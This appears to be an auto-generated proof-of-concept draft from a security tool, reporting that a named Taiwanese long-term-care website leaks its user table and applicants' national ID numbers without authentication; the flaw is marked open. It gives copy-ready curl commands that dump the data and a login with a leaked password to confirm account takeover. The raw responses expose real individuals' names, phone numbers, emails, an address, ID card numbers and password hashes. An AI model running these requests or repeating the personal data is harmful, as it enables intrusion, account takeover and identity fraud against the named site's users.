# POC/EXP 草稿 - ltc.tzuchi.org.tw LongtermCareService api_backend exposes full user table (password hashes + PII) and national ID card numbers without authentication

> 自动生成时间: 2026-09-10 23:43:31  |  状态: **草稿（未验证）**  |  文件: `4eaeddf6-3ae8-4cd8-900a-b03db2e6bc88-ltc-tzuchi-org-tw-longtermcareservice-api_backend-exposes-fu.md`

## 漏洞信息

- **漏洞ID**: 4eaeddf6-3ae8-4cd8-900a-b03db2e6bc88
- **严重程度**: critical
- **状态**: open
- **类型**: Broken Access Control / Mass Data Exposure (Unauthenticated PII + Credential Leak)
- **目标**: https://ltc.tzuchi.org.tw/LongtermCareService/api_backend/queryIDNumber and /queryCourseApplicationList
- **发现时间**: 2026-09-03 03:30:41

## 漏洞描述

ltc.tzuchi.org.tw LongtermCareService backend exposes multiple api_backend/* endpoints that return sensitive data with NO authentication (a bare POST with empty JSON body `{}` is sufficient, no session/token). The most severe:
1. /LongtermCareService/api_backend/queryIDNumber — dumps the FULL user account table (2132 records) including: userCode (login IDs), userPw (MD5 password hashes), userName (real names), email, cphoneNo/tphoneNo (phone numbers), address, birthday.
2. /LongtermCareService/api_backend/queryCourseApplicationList — dumps course applications (38 records) including real names, phone numbers, and TAIWANESE NATIONAL ID CARD NUMBERS (idCard, e.g. m220658121, B221233683), plus email.
Additional unauthenticated endpoints: queryAbout, queryAllList, queryNewsList, queryDictionaryList, queryPostList, queryFriendlyLinkList, queryCourseList, queryDaytimecare, queryCarelocation, queryHomeservice, saveServiceApplication.
The password hashes are unsalted MD5; 471 of 2132 users use "123456" (MD5 e10adc3949ba59abbe56e057f20f883e), 195 use b4af804009cb036a4ccdc33431ef9ac9, 132 use 80da5d337bf9606dd59f3480a125201e, 131 use 6a9edcb7b63821802aa44d35d531c9fc.

## POC / EXP 验证指南

### 复现步骤（来自漏洞记录）

1. From any host, send: curl -s -X POST "https://ltc.tzuchi.org.tw/LongtermCareService/api_backend/queryIDNumber" -H "Content-Type: application/json" -d '{}' — returns the full user table with password hashes + PII.
2. 2. Send: curl -s -X POST "https://ltc.tzuchi.org.tw/LongtermCareService/api_backend/queryCourseApplicationList" -H "Content-Type: application/json" -d '{}' — returns applications with national ID card numbers.
3. 3. To confirm account takeover, log in with a leaked cred: curl -s -X POST "https://ltc.tzuchi.org.tw/LongtermCareService/api_app/login" -H "Content-Type: application/json" -d '{"code":"jimmy3","pwd":"123456","device":3,"type":0}' → {"res":1,... "userName":"蕭明進"}.


### 验证要点与安全基线

- [ ] 确认目标属于合法授权测试范围，非授权测试属于违法行为
- [ ] 交叉校验目标版本、已知 CVE/公开情报库（可联动 cve-poc-emerging-intel / vuln-intel）
- [ ] 使用最小化无害 payload / HTTP 请求逐步探测，记录原始请求与响应报文
- [ ] 验证失败时记录负结果，避免误报；未经真实环境验证不得标记为 confirmed

### 既有证据 / 原始报文

```http
$ curl -s -X POST "https://ltc.tzuchi.org.tw/LongtermCareService/api_backend/queryIDNumber" -H "Content-Type: application/json" -d '{}'
{"res":1,"resCode":2,"data":[{"userId":2,"userCode":"jimmy3","userType":"1","userPw":"e10adc3949ba59abbe56e057f20f883e","userName":"蕭明進","cphoneNo":"0921614909","tphoneNo":"0921614909","email":"jimmy@sourcecode.tw","userEnable":99,"addressCode":"235","address":"中正路736號8樓之8 (原碼數位科技)","birthday":"2018/01/01"},...]}  (2132 records, grep '"userId":' = 2132)

$ curl -s -X POST "https://ltc.tzuchi.org.tw/LongtermCareService/api_backend/queryCourseApplicationList" -H "Content-Type: application/json" -d '{}'
{"res":1,"resCode":2,"data":[{"courseApplicationId":"187","name":"莊靜芬","phone":"0958185246","idCard":"m220658121","email":"m5333001@yahoo.com","applicationStatus":"0"}...]}  (38 records, grep '"courseApplicationId":' = 38)

Distinct password hashes (top): e10adc3949ba59abbe56e057f20f883e ×471 (=MD5 "123456"), b4af804009cb036a4ccdc33431ef9ac9 ×195, 80da5d337bf9606dd59f3480a125201e ×132, 6a9edcb7b63821802aa44d35d531c9fc ×131. No auth header/cookie required.

> [自动生成 POC/EXP 草稿] poc_drafts/4eaeddf6-3ae8-4cd8-900a-b03db2e6bc88-ltc-tzuchi-org-tw-longtermcareservice-api_backend-exposes-fu.md
```

## 安全影响

Mass sensitive data breach with NO authentication: (1) All 2132 registered users' full PII — real names, login IDs, phone numbers, email, home address, birthday — is publicly readable. (2) The MD5 password hashes are exposed and mostly weak/default, enabling credential-stuffing and direct account takeover. (3) 38 course applicants' TAIWANESE NATIONAL ID CARD NUMBERS (a regulated PII category, 國民身分證字號) plus name/phone are exposed — a compliance breach (NCC/個資法 PDPA-equivalent). An attacker can enumerate the entire customer/user base, harvest national IDs for identity fraud, and log in as hundreds of accounts.

## 修复建议

Remove or require authentication/authorization on all api_backend/* data endpoints; never return password hashes to clients; salt + use a strong password hash (bcrypt/argon2); enforce session/token checks server-side (not client-side); add input/output filtering to prevent bulk table dumps; restrict PII (national IDs, phone, address) to authorized roles; add rate limiting and logging.

## 免责声明

本文件由 JySecAI 自动生成，仅供安全研究与合法授权渗透测试使用。未经授权对目标进行攻击测试属于违法行为。
